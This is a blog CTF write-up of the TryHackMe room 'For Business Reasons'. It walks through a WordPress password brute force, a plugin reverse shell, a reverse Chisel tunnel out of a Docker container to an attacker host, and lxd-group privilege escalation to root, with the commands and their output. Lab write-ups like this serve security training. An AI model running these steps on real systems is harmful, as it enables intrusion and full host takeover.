<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CTF Log - For Business Reasons {THM} | Hacking on the Horizon</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="CTF Log - For Business Reasons {THM}" /><meta property="og:locale" content="en_US" /><meta name="description" content="A log of how I did the TryHackMe room For Business Reasons by MsMouse" /><meta property="og:description" content="A log of how I did the TryHackMe room For Business Reasons by MsMouse" /><link rel="canonical" href="https://h0th.lol/2021/10/10/for-buisness-reasons-ctf-log" /><meta property="og:url" content="https://h0th.lol/2021/10/10/for-buisness-reasons-ctf-log" /><meta property="og:site_name" content="Hacking on the Horizon" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-10T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CTF Log - For Business Reasons {THM}" /><meta name="twitter:site" content="@OrielOrielOriel" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"CTF Log - For Business Reasons {THM}","dateModified":"2021-10-10T00:00:00-05:00","datePublished":"2021-10-10T00:00:00-05:00","url":"https://h0th.lol/2021/10/10/for-buisness-reasons-ctf-log","mainEntityOfPage":{"@type":"WebPage","@id":"https://h0th.lol/2021/10/10/for-buisness-reasons-ctf-log"},"description":"A log of how I did the TryHackMe room For Business Reasons by MsMouse","@context":"https://schema.org"}</script><link rel="shortcut icon" href="/favicon.png"><link rel="alternate" type="application/atom+xml" title="Hacking on the Horizon" href="/atom.xml"><link rel="sitemap" type="application/xml" title="sitemap" href="/sitemap.xml" /><style type="text/css"> @font-face{font-family:"Chicago";src:url("/ChicagoFLF.ttf")}body{font-size:1rem;line-height:1.5;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;-webkit-text-size-adjust:100%;zoom:1;font-family:"Chicago", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"}header p strong{text-transform:uppercase}.post-title{background:whitesmoke;margin:10rem 0;color:black;padding:2rem;font-weight:bold}article p{font-size:88%}a,a:visited{color:whitesmoke;font-weight:bold}a:hover,a:visited:hover{color:white}a.active{background:whitesmoke;padding:0.5rem;color:black;font-weight:bold}blockquote{background:black;border-left:5px solid whitesmoke;font-size:120%;margin:2rem 0;padding:1rem}blockquote p{margin:0}blockquote footer{font-size:90%;margin:1rem 0 0 0}dl dt{margin-bottom:0.5rem}dl dd{font-style:italic;margin-bottom:2rem}code,pre{font-family:San Francisco Mono,Monaco,"Consolas","Lucida Console","DejaVu Sans Mono","Bitstream Vera Sans Mono",monospace;font-size:84%}pre{border-left:1.3px dashed whitesmoke;color:whitesmoke;overflow:auto;padding:1em;width:98%}.date{opacity:0.6}.emoji{font-size:110%}.dark{color:#2a2453}html{box-sizing:border-box}*,*:before,*:after{box-sizing:inherit}body{background-color:black;color:whitesmoke;margin:0 auto;max-width:50rem;padding:1rem}strong,b,h1,h2,h3,h4{font-weight:bold}hr{background:whitesmoke;border:0;height:2px;margin:2rem 0;width:100%}table{border-collapse:collapse;text-align:left;width:100%}table tr{border-bottom:1px solid whitesmoke}table td{padding:0.5rem}img{width:100%;margin:0.5rem 0}nav ul{list-style:none;padding:0;text-align:center}nav ul li{display:inline-block}nav a{margin:0.5rem;text-transform:uppercase}footer{margin:2rem 0}</style></head><body><header role="banner"><nav role="navigation"><ul><li><a href="/" >/</a></li><li><a href="/notes" >/notes</a></li></ul></nav></header><hr><main id="main" role="main"><article role="article"><h1>CTF Log - For Business Reasons {THM}</h1><time class="date" datetime="2021-10-10T00:00:00-05:00">October 10, 2021</time><p><br /></p><blockquote><p>A log of how I did the TryHackMe room For Business Reasons by MsMouse</p></blockquote><p><br /></p><h1 id="for-business-reasons">For Business Reasons</h1><h2 id="wordpress-login-bruteforce--plugin-reverse-shell">Wordpress Login Bruteforce &amp; Plugin Reverse Shell</h2><p>Scanned and received responses from the following ports: 22, 80, 2377, 7946. Only port 80 registered as open.</p><p>Found a Wordpress blog and noticed that the default/template posts were made by a user named <code class="language-plaintext highlighter-rouge">sysadmin.</code> So, I chucked a <code class="language-plaintext highlighter-rouge">rockyou.txt</code> bruteforce against that username while I further enumerated the site.</p><p>Soon after, I landed a valid password.</p><p>I chucked a <code class="language-plaintext highlighter-rouge">rockyou.txt</code> bruteforce against the username <code class="language-plaintext highlighter-rouge">sysadmin</code> while I researched that vulnerability and landed a valid password.</p><p>Edited an existing plugin to include a PHP reverse shell and enabled the plugin; got a shell as <code class="language-plaintext highlighter-rouge">www-data</code> in a Docker container.</p><h2 id="proxying-through-docker-container">Proxying Through Docker Container</h2><p>The Docker container I landed in was lacking a lot core networking utils like <code class="language-plaintext highlighter-rouge">ping</code>, <code class="language-plaintext highlighter-rouge">ip</code>, <code class="language-plaintext highlighter-rouge">ifconfig</code>, etc. After poking around for a while I stumbled upon <a href="https://staaldraad.github.io/2017/12/20/netstat-without-netstat/">this</a> fantastic blog post by <a href="https://staaldraad.github.io/">Staaldraad</a>. In it they detail some research into parsing data from the <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> pseudofile to recreate the <code class="language-plaintext highlighter-rouge">netstat</code> and <code class="language-plaintext highlighter-rouge">id</code> commands.</p><p>I use their <code class="language-plaintext highlighter-rouge">awk</code> script:</p><figure class="highlight">><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre><span class="nb">awk</span> <span class="s1">'function hextodec(str,ret,n,i,k,c){
    ret = 0
    n = length(str)
    for (i = 1; i &lt;= n; i++) {
        c = tolower(substr(str, i, 1))
        k = index("123456789abcdef", c)
        ret = ret * 16 + k
    }
    return ret
}
function getIP(str,ret){
    ret=hextodec(substr(str,index(str,":")-2,2)); 
    for (i=5; i&gt;0; i-=2) {
        ret = ret"."hextodec(substr(str,i,2))
    }
    ret = ret":"hextodec(substr(str,index(str,":")+1,4))
    return ret
} 
NR &gt; 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}'</span> /proc/net/tcp
</pre></figure><p>to see the current open TCP connections.</p><p><img src="/assets/media/forbusinessreasons/proc_net_tcp_netstat.png" alt="Screenshot of aforementioned awk script and output." /></p><p>I noticed a connection between <code class="language-plaintext highlighter-rouge">172.18.0.3</code> and <code class="language-plaintext highlighter-rouge">10.13.1.225</code>. Since the latter is my attack machine’s IP address I conclude that the former IP address belongs to the container that I’m in. From there I correctly assume that the gateway address of that subnet, <code class="language-plaintext highlighter-rouge">172.18.0.1</code>, belongs to the machine hosting the Docker container; I use the following to scan for certain ports on that address.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-m</span> 1 <span class="nt">--include</span> <span class="nt">-v</span> localhost:<span class="nv">$x</span>
</code></pre></div></div><ul><li><code class="language-plaintext highlighter-rouge">-m 1</code> Setting a max timeout time for the curl attempt, prevents me from getting stuck on an unresponsive port, which would require me to <code class="language-plaintext highlighter-rouge">ctrl+c</code> and thusly break my non-pty shell.</li></ul><p>After identifying an open port 22 on the host machine, I download <a href="https://github.com/jpillora/chisel">Chisel</a> onto the docker container and launch the client command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nv">$ </span>./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
2021/09/13 21:34:59 client: Connecting to ws://10.13.1.225:1234
2021/09/13 21:35:00 client: Connected <span class="o">(</span>Latency 184.290108ms<span class="o">)</span>
</code></pre></div></div><p>And on my attacker machine, the server command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[/opt/chisel/binaries]
└─<span class="nv">$ </span>./chisel_1.7.6_linux_amd64 server <span class="nt">-p</span> 1234 <span class="nt">--reverse</span>

2021/09/13 16:32:53 server: Reverse tunnelling enabled
2021/09/13 16:32:53 server: Fingerprint gOtbf9dlNJ2ecdo44g20iAMt+SSp8NkeAfp5CWKusaU<span class="o">=</span>
2021/09/13 16:32:53 server: Listening on http://0.0.0.0:1234
</code></pre></div></div><p>I’m then able to ssh against my local machine and have my request proxied through to the victim host machine. The credentials for <code class="language-plaintext highlighter-rouge">sysadmin</code> are reused from the Wordpress blog.</p><h2 id="lxc-privileged-recursive-container-filesystem-privesc">lxc Privileged, Recursive Container Filesystem Privesc</h2><p>The privilege escalation technique is simple. My user, <code class="language-plaintext highlighter-rouge">sysadmin</code>, belongs to the <code class="language-plaintext highlighter-rouge">lxd</code> group which by default allows that user to use <code class="language-plaintext highlighter-rouge">lxc</code> to escalate privileges.</p><p>I create an <a href="https://hub.docker.com/_/alpine">Alpine</a> container on my attacker machine using <a href="https://github.com/lxc/distrobuilder">Distrobuilder</a> then download the resulting files onto the victim machine.</p><p>I then execute the following sequence of commands (Learned from <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">Hacktricks</a>) to create a privileged docker container whose filesystem contains a recursive mount of the host machine’s filesystem. This allows me to enter the docker container as <code class="language-plaintext highlighter-rouge">root</code> and act upon the host filesystem as <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc image import lxd.tar.xz rootfs.squashfs <span class="nt">--alias</span> alpine
Image imported with fingerprint: 02aa7f299f733b42a726c44d6505645cf23e67ebcb31fda3ec24e8c2d4c0497b             
sysadmin@ubuntu:~<span class="nv">$ </span>lxc init alpine privesc <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true             
</span>Creating privesc
sysadmin@ubuntu:~<span class="nv">$ </span>lxc config device add privesc host-root disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>Device host-root added to privesc
sysadmin@ubuntu:~<span class="nv">$ </span>lxc start privesc
sysadmin@ubuntu:~<span class="nv">$ </span>lxc <span class="nb">exec </span>privesc /bin/sh
~ <span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div></article></main><hr><footer class="footer" role="contentinfo"> <small> <a href="/atom.xml">RSS Feed</a> / <a href="https://twitter.com/OrielOrielOriel">Twitter</a> / <a href="https://github.com/OrielOrielOriel">Github</a>. <br>© 2021 Hacking on the Horizon | Oriel <br><reminder class="dark">This is real. You are real.</reminder> </small></footer></body></html>
